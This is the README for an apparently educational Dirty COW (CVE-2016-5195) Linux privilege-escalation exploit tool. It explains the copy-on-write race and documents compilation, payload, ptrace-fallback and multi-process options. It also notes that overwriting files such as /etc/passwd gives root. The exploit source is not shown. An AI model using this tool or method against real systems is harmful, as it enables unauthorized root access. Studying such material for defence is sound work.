
# Dirty COW Educational PoC (CVE-2016-5195)

## ⚠️ Legal Warning

**This code is for EDUCATIONAL PURPOSES ONLY. Any malicious use is strictly prohibited and illegal.**


## 📖 What is Dirty COW?

Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel that exploits a race condition in the kernel's copy-on-write (COW) mechanism. This vulnerability affects Linux kernels from version 2.6.22 (released in 2007) to versions before:

- 4.8.3
- 4.7.9  
- 4.4.26

### Technical Details

The vulnerability occurs in the kernel's memory management system:

1. **Copy-On-Write (COW)**: When a process maps a file with `MAP_PRIVATE`, modifications should create a private copy
2. **Race Condition**: Two threads racing between `madvise(MADV_DONTNEED)` and writing to `/proc/self/mem`
3. **Exploitation**: Under specific timing conditions, writes can bypass COW protection and modify the original file

### Impact

- **Privilege Escalation**: Modify read-only files owned by root
- **System Compromise**: Potential to gain root access by modifying system files like `/etc/passwd`
- **Data Integrity**: Unauthorized modification of critical system files

## 🛡️ Security Notes for Testing

### ⚠️ CRITICAL: Test Only in Isolated Environment

**NEVER run this on production systems or systems you don't own!**

### Recommended Test Environment:

1. **Virtual Machine (VM)**: Use VMware, VirtualBox, or KVM
2. **Container**: Docker container with vulnerable kernel
3. **Isolated Lab**: Dedicated test machine with no important data
4. **Kernel Requirements**: Linux kernel versions 2.6.22 to 4.8.2

### Safe Testing Practices:

```bash
# 1. Check kernel version first
uname -r

# 2. Create isolated test directory
mkdir /tmp/dirtycow_test
cd /tmp/dirtycow_test

# 3. Test with harmless files only
./main -t /tmp/test_file -v

# 4. Monitor system resources
top -p $(pgrep -f main)
```

## 🚀 Compilation & Usage

### Prerequisites

```bash
# Install required packages (Ubuntu/Debian)
sudo apt-get update
sudo apt-get install build-essential libssl-dev

# Install required packages (CentOS/RHEL)
sudo yum install gcc openssl-devel
```

### Compilation

```bash
# Standard compilation
make

# Debug version
make main-debug

# Manual compilation
gcc -o main main.c -lpthread -lssl -lcrypto
```

### Basic Usage

```bash
# Simple test with default settings
./main

# Verbose mode with custom target
./main -t /tmp/testfile -v

# Advanced usage with multiple processes
./main -t /tmp/target -n 4 -r 3 -D -v

# Binary payload from file
./main -f payload.bin -P -D -n 2
```

### Command Line Options

| Option | Description | Default | Max |
|--------|-------------|---------|-----|
| `-t <file>` | Target file path | `/tmp/dirty_cow_test` | - |
| `-p <payload>` | Custom text payload | Test string | - |
| `-f <file>` | Load binary payload from file | - | - |
| `-i <num>` | Number of iterations | 10,000,000 | 100,000,000 |
| `-n <num>` | Number of parallel processes | 1 | 8 |
| `-r <num>` | Retry attempts | 1 | 10 |
| `-P` | Use ptrace instead of /proc/self/mem | Disabled | - |
| `-D` | Enable dynamic offset scanning | Disabled | - |
| `-v` | Verbose output | Disabled | - |
| `-l <file>` | Log file path | `exploit_log.txt` | - |
| `-h` | Show help | - | - |

## 🔬 Advanced Features

### 1. Multiple Attack Methods

- **Method 1**: `/proc/self/mem` writing (default)
- **Method 2**: `ptrace(PTRACE_POKETEXT)` for restricted systems

### 2. Dynamic Offset Scanning

Scans multiple memory offsets to find the best write position:

```bash
./main -D -v  # Enable dynamic offset scanning
```

### 3. Multi-Process Race Conditions

Launch multiple processes for intense race conditions:

```bash
./main -n 4  # Use 4 parallel processes
```

### 4. Binary Payload Support

Load arbitrary binary data from files:

```bash
# Create binary payload
echo -ne '\x41\x41\x41\x41\x00\x42\x42' > payload.bin

# Use binary payload
./main -f payload.bin -v
```

### 5. Automatic Retry Logic

Retry failed attempts automatically:

```bash
./main -r 5  # Retry up to 5 times
```

### 6. File Integrity Verification

Uses SHA-256 hashing to verify file modifications:

```bash
# Check original vs modified file hashes
./main -v  # Shows hash comparison in verbose mode
```

## 📊 Output & Logging

### Console Output Example

```
Dirty COW Educational PoC (CVE-2016-5195)
==========================================

=== SYSTEM INFORMATION ===
Kernel Version: Linux 4.4.0-generic
Architecture: x86_64
Current User: testuser
UID/GID: 1000/1000

=== VULNERABILITY CHECK ===
Kernel: Linux version 4.4.0-generic
[+] /proc/self/mem accessible

=== STARTING TEST ===

=== EXPLOIT EXECUTION ===
[+] Target: /tmp/dirty_cow_test
[+] Payload length: 32 bytes
[+] Iterations: 10000000
[+] Processes: 1
[+] Method: /proc/self/mem
[+] Dynamic offset: disabled
[+] Backup created: /tmp/dirty_cow_test.backup
[+] Original content: original-content-before-exploit
[+] Starting race condition test...
[+] EXPLOIT SUCCESSFUL on attempt 1!
[+] File hash changed - modification confirmed!
[+] Original: a1b2c3d4e5f6...
[+] Final:    f6e5d4c3b2a1...

=== TEST SUCCESSFUL ===
[+] File modification completed
[+] Educational objective achieved
[+] Statistics: 156789 writes, 1 successful, 2.347 sec
```

### Log File Format

The tool creates detailed logs in `exploit_log.txt`:

```
[2024-01-15 10:30:45] System Info - UID/GID: 1000/1000
[2024-01-15 10:30:45] Kernel version: Linux version 4.4.0-generic
[2024-01-15 10:30:45] /proc/self/mem accessible
[2024-01-15 10:30:45] Starting exploit - Target: /tmp/test, Payload: 32 bytes
[2024-01-15 10:30:47] EXPLOIT SUCCESSFUL on attempt 1
[2024-01-15 10:30:47] Final stats - Writes: 156789, Successful: 1, Duration: 2.347 sec
```

## 🎯 Test Scenarios

### Scenario 1: Basic Functionality Test

```bash
# Test basic exploit functionality
./main -t /tmp/basic_test -v
```

### Scenario 2: Stress Test

```bash
# High-intensity race condition test
./main -i 50000000 -n 4 -r 3 -D -v
```

### Scenario 3: Restricted Environment

```bash
# Test when /proc/self/mem is blocked
./main -P -D -v
```

### Scenario 4: Binary Payload Test

```bash
# Test with binary data containing null bytes
echo -ne 'BINARY\x00DATA\x01\x02\x03' > test.bin
./main -f test.bin -v
```

## 🔍 Understanding the Exploit

### Race Condition Timing

The exploit works by creating a race between two operations:

1. **Thread 1**: `madvise(MADV_DONTNEED)` - Tells kernel to discard memory pages
2. **Thread 2**: Writing to `/proc/self/mem` - Attempts to write to mapped memory

### Success Factors

- **Kernel Version**: Must be vulnerable (< 4.8.3)
- **Timing**: Race condition must occur at precise moment
- **Memory Mapping**: File must be mapped with `MAP_PRIVATE`
- **Permissions**: Must have read access to target file

### Why It Works

When the race condition succeeds:
1. Thread 1 discards the COW page
2. Thread 2 writes occur before new COW page is created
3. Write goes directly to original file instead of private copy

## 🛠️ Troubleshooting

### Common Issues

**1. "Exploit failed or insufficient iterations"**
- Solution: Increase iterations with `-i` or use multiple processes `-n`

**2. "/proc/self/mem access failed"**
- Solution: Use ptrace method with `-P` flag

**3. "System may not be vulnerable"**
- Check kernel version: `uname -r`
- Ensure kernel is older than 4.8.3

**4. System becomes unresponsive**
- Reduce iterations: `-i 1000000`
- Use fewer processes: `-n 1`

### Performance Tuning

```bash
# Conservative settings (slower but safer)
./main -i 5000000 -n 1

# Aggressive settings (faster but resource intensive)
./main -i 50000000 -n 4 -D

# Balanced settings
./main -i 20000000 -n 2 -r 2 -D
```

## 📚 Educational Resources

### CVE Information
- **CVE-2016-5195**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195
- **NVD Database**: https://nvd.nist.gov/vuln/detail/CVE-2016-5195

### Additional Reading
- Linux Kernel Memory Management
- Copy-On-Write Mechanism  
- Race Condition Vulnerabilities
- Privilege Escalation Techniques

## 🤝 Contributing

This is an educational tool. Contributions should focus on:
- Improving educational value
- Adding safety features
- Better documentation
- Code clarity and comments

## ⚖️ Disclaimer

This software is provided for educational and research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this program. Users are solely responsible for ensuring they have proper authorization before testing on any systems.

**By using this software, you acknowledge that:**
- You will only use it for legitimate educational purposes
- You have proper authorization for any testing performed
- You understand the legal implications of unauthorized system testing
- You will not use this tool for malicious purposes

## 📝 License

This project is released under the MIT License for educational purposes only.

---

*Remember: With great power comes great responsibility. Use this knowledge to protect and secure systems, not to harm them.*
